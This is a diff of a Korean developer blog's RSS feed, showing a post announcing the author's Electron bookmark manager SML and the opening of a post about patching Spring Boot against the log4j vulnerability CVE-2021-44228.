@@ -893,7 +1606,505 @@ import * as auth from &quot;#middleware/auth.js&quot;;&lt;/code&gt;&lt;/pre&gt;&
 &lt;p&gt;청구서의 청구 기간을 하단으로 내리면 최초 청구일이 나오는데 그거에서 &lt;strong&gt;1년&lt;/strong&gt;이 지난 기간이 프리티어 기간이다.&lt;/p&gt;
 &lt;br&gt;
 &lt;hr&gt;
-&lt;p&gt;나처럼 개발용으로 사용하는 사람들은 이 기간을 잘 확인해두었다가 마지막 달에 사용하는 서비스를 모두 정리하고 계정을 탈퇴하면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Let'sEncrypt 갱신이 불가할 때 (produced an unexpected error The manual plugin is not working)]]></title><description><![CDATA[22.09.25 내용 추가 여기서 진행한 방식의 경우 standalone 방식이다. 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다. 최근 방식의 경우 Webroot나 DNS…]]></description><link>https://elfinlas.github.io/letsencrypt/211105_letscert-fail/</link><guid isPermaLink="false">https://elfinlas.github.io/letsencrypt/211105_letscert-fail/</guid><pubDate>Fri, 05 Nov 2021 18:05:11 GMT</pubDate><content:encoded>&lt;h1 id=&quot;220925-내용-추가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#220925-%EB%82%B4%EC%9A%A9-%EC%B6%94%EA%B0%80&quot; aria-label=&quot;220925 내용 추가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;22.09.25 내용 추가&lt;/h1&gt;
+&lt;p&gt;나처럼 개발용으로 사용하는 사람들은 이 기간을 잘 확인해두었다가 마지막 달에 사용하는 서비스를 모두 정리하고 계정을 탈퇴하면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[즐겨찾기 관리 프로그램 SML 배포]]></title><description><![CDATA[즐겨찾기 관리 프로그램을 만들다. 예전 포스팅 에서 공개했던 프로그램을 완성했다.
+사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.  예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다. 아직 미흡한 부분이 남아있지만… SML…]]></description><link>https://elfinlas.github.io/my_project/211229_introduce-sml/</link><guid isPermaLink="false">https://elfinlas.github.io/my_project/211229_introduce-sml/</guid><pubDate>Wed, 29 Dec 2021 01:40:16 GMT</pubDate><content:encoded>&lt;h1 id=&quot;즐겨찾기-관리-프로그램을-만들다&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A6%90%EA%B2%A8%EC%B0%BE%EA%B8%B0-%EA%B4%80%EB%A6%AC-%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%A8%EC%9D%84-%EB%A7%8C%EB%93%A4%EB%8B%A4&quot; aria-label=&quot;즐겨찾기 관리 프로그램을 만들다 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;즐겨찾기 관리 프로그램을 만들다.&lt;/h1&gt;
+&lt;p&gt;예전 &lt;a href=&quot;https://elfinlas.github.io/til/211207_devnote/&quot;&gt;포스팅&lt;/a&gt; 에서 공개했던 프로그램을 완성했다.
+사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 61.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACi0lEQVQoz5WSyW7UQBCG/QIceQmegJgDBInHgEPICYlDLkhI2RyJCQcUTpAomS1OWARCQiE38gqIJFIyHlACs2RWj2fcXrrttquodiYjONLSr+puV3/9V5e1xw/u3zCMxb1c7sX+wrzxZX7eoLjyj+bmnmRamHwz9q/yntKZtaVne4cvNw8OFp7f1RaXlu9t5ov47v0HLG2bpJ1Llc3JuqziZP1Xjpqbu/i2VEZzLYfFlaVHWrVavSNEJBFRKR7H/5X4LVw8rJ/NaCcnJ9OdThcHAwfDMICRx6HWUxI0FxBFEZxfHIHvOyBETBI096HT7YJtOxD6A+D9VoJCYqNWm9Uqlcp0q9XGXq+PnudBIBK0fcQeQwyVXxq+c44y8vFqJGmKzPMwCDliGkDK7CSVCdYbjUugcjdwHGSMgc8ldlzA9ghwGAAdB/xWv8Bm16IbqpgCoJQSh8MhGQgQpA+J20/SWAHrYyDBFDSOI4gSzIBKbgiZo/TXEYrDr5iKIFtnwNFoDPQgGfXGwLFDdZtK4GEI9ExULmCXgPScGaDZt9Bzf2ZzGANd10XfDxGSscOrkk9PT6dt2wYuVANEGkYpEAzaoxTIIZ2nyM6AcQ/oZwA14liC4zjAmA9p5rAvE3JYa9QfapZlZSUHQYCCc+SxKhmxNaJmRJdNcFpH+L39A5u2PWlK5jAI6T4fU3KICWDzojmrHR8f36aSJQGlEDz2Ay4dxuXA5dKjDtGebLQ6sjZwJec8k8oloGTMk2HAZOg6wmMeVixrRltdXb1mmubNYrGob21tTZWKeX13O6+/MfN6uZSnvbz++dNHfWfjlb6+saEXCoVMdEYvl8t6vlDSi9s7U6/X128tG8b1P2LNMPTtP6H+AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 01&quot;
+        title=&quot;img 01&quot;
+        src=&quot;/static/8728b9aed7df835bf766f441010696b2/c1b63/img_01.png&quot;
+        srcset=&quot;/static/8728b9aed7df835bf766f441010696b2/5a46d/img_01.png 300w,
+/static/8728b9aed7df835bf766f441010696b2/0a47e/img_01.png 600w,
+/static/8728b9aed7df835bf766f441010696b2/c1b63/img_01.png 1200w,
+/static/8728b9aed7df835bf766f441010696b2/d61c2/img_01.png 1800w,
+/static/8728b9aed7df835bf766f441010696b2/97a96/img_01.png 2400w,
+/static/8728b9aed7df835bf766f441010696b2/669cd/img_01.png 3024w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다.&lt;br&gt;
+아직 미흡한 부분이 남아있지만…&lt;br&gt;
+SML을 만들면서 몇 가지 목표가 있었고, 그 중 한가지가 &lt;strong&gt;내가 필요해서 만들었으니 나에게 맞는 기능을 만들어 써보자&lt;/strong&gt; 였다.&lt;/p&gt;
+&lt;p&gt;사실 프로그래머 개발자 이런게 뭐 별거인가?&lt;br&gt;
+그냥 내가 필요해서 만드는게 그 직업군이지.&lt;/p&gt;
+&lt;p&gt;무튼 그래서 내가 만들었고, 현재 잘 쓰고 있다.&lt;br&gt;
+노션에 정리할 때 보다 더 편리한거 같다.&lt;/p&gt;
+&lt;p&gt;공개는 &lt;a href=&quot;https://github.com/elfinlas/SML&quot;&gt;Github&lt;/a&gt; 에 해뒀고, 다운로드는 &lt;a href=&quot;https://github.com/elfinlas/SML/releases&quot;&gt;릴리즈&lt;/a&gt; 페이지에서 가능하다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;소스코드는…정리좀 하고 올릴 예정이다.&lt;br&gt;
+너무 하나에 몰아두고 짜서 보기 어렵다…&lt;br&gt;
+뭐 누가 보겠느냐 싶겠지만 그래도 추가 기능 개발 및 향후 내가 만들 웹 서비스에 연동을 위해서 몇 가지 사전 작업을 해둬야 해서…&lt;/p&gt;
+&lt;p&gt;곧 리펙토링 및 코드 정리가 끝나면 오픈할 예정이다.&lt;br&gt;
+참고로…&lt;br&gt;
+난 Javascript 라는것을 이번에 처음 공부하며 써보기 시작했다.&lt;br&gt;
+주로 Java 백엔드만 짜다가 제대로 공부해서 해보는 중이다.&lt;br&gt;
+뭐 이것도 사실 제대로 공부 안하고 일단 부딪쳐 보자 식으로 해본거지만…&lt;/p&gt;
+&lt;p&gt;Node를 공부하다가 일렉트론을 생각하게 되어 잠시 샛길로 빠져 만든 것이다.&lt;br&gt;
+그래서 코드가 조잡하고 그럴 수 있다. (밑밥?)&lt;br&gt;
+일렉트론…좀 더 제대로 공부하면 더 좋은(?) 결과를 낼 수 있었지만…&lt;br&gt;
+이번 SML은 사실 구동과 기능의 정상 작동에 포커스를 맞춰서 잘못 개발했을 수도 있다.&lt;/p&gt;
+&lt;p&gt;여담이지만 이걸 마지막으로 일렉트론은 접어둘 생각이다.&lt;br&gt;
+왜냐하면 곧 메인 개발을 해야 할 부분이 Node쪽이라서 그렇다.&lt;/p&gt;
+&lt;p&gt;정리하자면…소스코드는 정리하고 공개할 예정이며…&lt;/p&gt;
+&lt;p&gt;코드 오픈의 이유는 &lt;strong&gt;필요한 사람이 직접 추가 기능을 개발해서 쓰라는 의미&lt;/strong&gt;로 오픈하는 거니 코드의 품질이나 개발 방법론은 &lt;strong&gt;잠시 접어두자.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;뭐로-만들고-구성이-어떻게-되나&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%AD%90%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B3%A0-%EA%B5%AC%EC%84%B1%EC%9D%B4-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%90%98%EB%82%98&quot; aria-label=&quot;뭐로 만들고 구성이 어떻게 되나 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;뭐로 만들고 구성이 어떻게 되나?&lt;/h2&gt;
+&lt;p&gt;일렉트론으로 만들었고, 화면단은 &lt;strong&gt;Bootstrap 5&lt;/strong&gt;를 이용해서 만들었다.&lt;br&gt;
+원래는 지금 공부하는 리엑트를 적용해서 해볼까 했는데 이거 적용해서 하려면 너무 오래 걸릴거 같아서 그냥 부트스트랩으로 만들었다.&lt;br&gt;
+그리고 &lt;strong&gt;jQuery를 이번에는 쓰지 말자&lt;/strong&gt;라고 결심을 해서 쓰지 않았다.&lt;br&gt;
+덕분에 바닐라.js ? 그냥 순수한 자바스크립트를 바닐라라고 부르는 것도 이번에 처음 알았다 ’_‘;;&lt;/p&gt;
+&lt;p&gt;디비쪽은 &lt;strong&gt;SQLite&lt;/strong&gt;를 사용했다.&lt;br&gt;
+이런 작은 프로그램에서 쓰기엔 최고다.&lt;/p&gt;
+&lt;p&gt;백업과 복원을 위해서 JSON 형식으로 처리했다.&lt;/p&gt;
+&lt;p&gt;그 외 특이한 기술은 없고 Select 처리를 위해 치리오? 발음을 몰라서… &lt;a href=&quot;http://github.com/cheeriojs/cheerio&quot;&gt;cheerio&lt;/a&gt;를 사용했다.&lt;br&gt;
+알람창 이쁜거를 위해 &lt;strong&gt;sweetalert2&lt;/strong&gt;를 사용했다.&lt;/p&gt;
+&lt;h2 id=&quot;기능은&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B8%B0%EB%8A%A5%EC%9D%80&quot; aria-label=&quot;기능은 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;기능은?&lt;/h2&gt;
+&lt;p&gt;간단하다.&lt;br&gt;
+핵심 기능은 링크 데이터의 CRUD 이게 끝이다.&lt;br&gt;
+부가 기능으로 페이징과 검색정도?&lt;/p&gt;
+&lt;p&gt;데이터 등록과 수정은 비슷하니 굳이 서술하지 않겠다.&lt;br&gt;
+다만 태그 기능에 대해 약간 부연 설명을 하자면…&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 60.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACA0lEQVQoz6WSTW8SQRjH91NgTQqtLcQefEmwRC7GQHk1erXGAyQgBbQ9mbjvu0B4aTxysJcCH6PFxk/goldOSvkA3LR0hs7jM8M2adXUNG7yyzOz+59fntkZKbjs9fpXl+SFGz5lwbMoz/GKuuzzy4HVNfnenaB8H/GvrMm3lgLy77mbHu+7dd9t88Fi4K70MBR6lkqlIJl6ArFYAuLxJMQTSYhENmB39z30+x/h8LAPBwd9ODr6BJ1OF2LxBJIUWV4TyNPHj2BjPfhWyudfpSqVyqzVap1yGo0GaTZbpFarkeFwSADgEpPJhPBMvV4nmMdxnTQb9ROtakP+demNlMlk0oqigGlazDRNpukGUzST4Tv22XEYShghhBFKxXg0GjFd15mM33k1dJUZqkItw4Ti1ta2lMvl0pZlAXbJXKBarQKGYTAYAH9QCJRSMT4ej8HGTMXFnq+h3FEsFneEEDsTQtu22XmQCx3HgRmdwXQ6BUrmwvExCm1bIIR8jW1TPi+Xy1cLB1+/CMlPMoUfpyfA9/xt9P1PIXb4TyHfQrvdhm6vB/udfUG314UPe3vXEp7xgBtihmEwTdMuwQ/iPHMBISyVStt4bfLiUPAgGHLmVgFenb9yMeNCebeiw2w2m1ZVVfyz/6VQKOxIoVDIE4lEniMvkE23XpfNaDT6MhwOr/wCUUYmLfZV4esAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 02&quot;
+        title=&quot;img 02&quot;
+        src=&quot;/static/70c032cda9c800a885a37f4d3743dcac/c1b63/img_02.png&quot;
+        srcset=&quot;/static/70c032cda9c800a885a37f4d3743dcac/5a46d/img_02.png 300w,
+/static/70c032cda9c800a885a37f4d3743dcac/0a47e/img_02.png 600w,
+/static/70c032cda9c800a885a37f4d3743dcac/c1b63/img_02.png 1200w,
+/static/70c032cda9c800a885a37f4d3743dcac/d61c2/img_02.png 1800w,
+/static/70c032cda9c800a885a37f4d3743dcac/97a96/img_02.png 2400w,
+/static/70c032cda9c800a885a37f4d3743dcac/669cd/img_02.png 3024w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;위는 데이터 추가할 때 나오는 사진인데 모달 하단에는 태그를 위한 두 개의 선택 옵션이 있다.&lt;br&gt;
+하나는 기존에 추가된 태그를 선택하는 &lt;strong&gt;select&lt;/strong&gt; 이고, 하나는 새로운 태그를 추가할 때 쓰는 &lt;strong&gt;input&lt;/strong&gt; 이다.&lt;br&gt;
+이거 두개를 통합해서 사용하는 select 를 찾아봤는데… 죄다 jQuery 의존이 강하게 엮여있거나 vue, react 등으로 개발된 것들이었다.&lt;/p&gt;
+&lt;p&gt;내가 직접 개발하기엔 시간도 오래 걸리고 해서 결국 저렇게 뻘짓으로 개발해뒀다.&lt;br&gt;
+혹시 더 좋은 라이브러리나 방법이 있다면 공유 해주시면 감사하겠다.&lt;/p&gt;
+&lt;p&gt;백업의 경우 현재 SQLite에 저장된 모든 데이터를 JSON 파일로 뽑아서 특정 경로에 저장한다.&lt;br&gt;
+Mac의 경우 자신의 홈디렉토리에 SML 디렉토리에 저장한다.&lt;br&gt;
+그런데 윈도우는 내가 안써봐서 이상한 경로에 저장하는 듯 한다.&lt;/p&gt;
+&lt;p&gt;appData였나 무튼 추가하면 알림에 어느 경로에 저장되는지 표시는 뜨게 해두었다.&lt;/p&gt;
+&lt;h2 id=&quot;윈도우-문제&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9C%88%EB%8F%84%EC%9A%B0-%EB%AC%B8%EC%A0%9C&quot; aria-label=&quot;윈도우 문제 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;윈도우 문제&lt;/h2&gt;
+&lt;p&gt;윈도우를 내가 안써서 잘 모르겠다.&lt;br&gt;
+일렉트론 빌드로 윈도우용 exe를 만들었고, 설치할 때 c:\program files 인가 경로로 깔면 권한인가 뭐 때문에 정상적으로 안되는거 같았다.&lt;br&gt;
+그래서 테스트 환경에서는 d:\ 에 새로운 경로를 만들고 거기에 설치를 하니 잘 되었다.&lt;br&gt;
+그런데 설치 완료 후 아래와 같이 윈도우 디팬더에서 트로이잔이 나온다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 755px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 77.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAABdklEQVQ4y3VTa4+EIAz0//9Jk032g/tw1fUFiD2mOl7hciQTsMAwbcdqmiaZ51nWdb3gnJNlWTTOGUA8hCDeewXWBL6xX2GxbZuCmzFG3QQ5CElUDueDrM4rtrhrrJrTBSrjyyAk+b7vGQm+CR/SuS2K3zAfMSVE2lDCNKjQpogMLBkGlOXKE+FyEo7jeBEAUMwaMmZLo+v0MGYIwBuqkEVnyjgM4mH4St8PGivH1ZiUKuoIQpZDCaEOhFQCwqZp5PF4CF1AdQD29fG09j6vdWUtYBW23VeGER0+Os1M+IDeS01ZjUIltD7KUv6O0g+DKocqO0Cg5x3qPF1nNGWrzBKG8wF2+/l8yvv9lrZtU237dM7L4oJMS+6AqnQ7O/xKlz+fj3Rdp/PtdpO6rhX3+/04F3YZXZTT038JFaex4TGqA2iPeFrl1/B75s+q/C/5p5DI2qkcpdH/VQjDugAlMeugJVCY2EVoFViFPvis+1BrDVwq5fwD2L2abN8ttJoAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 03&quot;
+        title=&quot;img 03&quot;
+        src=&quot;/static/40e8c8810ebc7aa566d3baa1aaed5e7a/cab43/img_03.png&quot;
+        srcset=&quot;/static/40e8c8810ebc7aa566d3baa1aaed5e7a/5a46d/img_03.png 300w,
+/static/40e8c8810ebc7aa566d3baa1aaed5e7a/0a47e/img_03.png 600w,
+/static/40e8c8810ebc7aa566d3baa1aaed5e7a/cab43/img_03.png 755w&quot;
+        sizes=&quot;(max-width: 755px) 100vw, 755px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;왜 이런지 나도 잘 모르겠지만…&lt;br&gt;
+왠지 개발자 서명이 안되어서 그런게 아닐까 싶다.&lt;/p&gt;
+&lt;p&gt;그래서 github Readme 에도 찝찝한 사람은 직접 빌드해서 쓰라고 명시해뒀다.&lt;br&gt;
+그리고 조만간 코드 오픈도 되니까 뭔가 문제가 있는 코드가 있었다면 메일이나 다른 채널로 알려주지 않을까 싶다 ㅎㅎ&lt;/p&gt;
+&lt;h2 id=&quot;그래서-결론은&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B7%B8%EB%9E%98%EC%84%9C-%EA%B2%B0%EB%A1%A0%EC%9D%80&quot; aria-label=&quot;그래서 결론은 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;그래서 결론은?&lt;/h2&gt;
+&lt;p&gt;이번 프로그램을 배포 후 몇 가지 건의를 받은 것도 있는데 이 부분은 개발을 해서 버전 업을 할 예정이다.&lt;br&gt;
+거기까지 해두고 내가 만들려던 서비스를 만들어갈 예정이다.&lt;br&gt;
+뭐 이미 너무 아이디어가 공개되어 있어서 오픈할까 했지만 그래도 직접 만든 후 오픈하는게 좋지 않을까 싶어서 언급을 안하려 한다.&lt;/p&gt;
+&lt;p&gt;깃허브 릴리즈 노트 같은것도 이쁘게 꾸며보고 싶었지만…&lt;br&gt;
+시간이 부족해서…&lt;br&gt;
+그냥 여기까지만 해두려 한다.&lt;/p&gt;
+&lt;p&gt;해당 프로그램이 유용했다면 Github의 Star 한번 부탁드리고, 의견이나 버그 등이 있다면 메일로 부탁한다.&lt;br&gt;
+이 프로그램이 유용했기를 바라면서 다음 버전으로 인사드리겠다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Spring boot log4j 취약점 처리 후기 (CVE-2021-44228)]]></title><description><![CDATA[요새 시끄러운 log4j2 공격… 요새 Log4J…]]></description><link>https://elfinlas.github.io/spring_spring-boot/211214_springboot-log4j-hack/</link><guid isPermaLink="false">https://elfinlas.github.io/spring_spring-boot/211214_springboot-log4j-hack/</guid><pubDate>Tue, 14 Dec 2021 11:38:55 GMT</pubDate><content:encoded>&lt;h2 id=&quot;요새-시끄러운-log4j2-공격&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9&quot; aria-label=&quot;요새 시끄러운 log4j2 공격 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;요새 시끄러운 log4j2 공격…&lt;/h2&gt;
+&lt;p&gt;요새 Log4J2 취약점 때문에 난리다.&lt;br&gt;
+사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만…)&lt;br&gt;
+보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다.&lt;br&gt;
+조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다.&lt;br&gt;
+개발쪽은 역시 부지런해야 살아남는듯…&lt;/p&gt;
+&lt;p&gt;사설이 길었다.&lt;br&gt;
+이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다.&lt;br&gt;
+정 궁금하신 분은 &lt;strong&gt;&lt;a href=&quot;https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389&quot;&gt;이곳 KISA&lt;/a&gt;&lt;/strong&gt; 에서 확인해보기 바란다.&lt;/p&gt;
+&lt;p&gt;나는 현재 개인적으로 돌리는 서비스가 있는데 Spring boot 기반으로 되어 있다.&lt;br&gt;
+저 이슈보자마자 바로 문제가 생기겠구나 싶어서 확인했다.&lt;br&gt;
+처리는 금방 했는데 블로그에는 좀 늦게 올리게 되었다.&lt;/p&gt;
+&lt;br&gt;
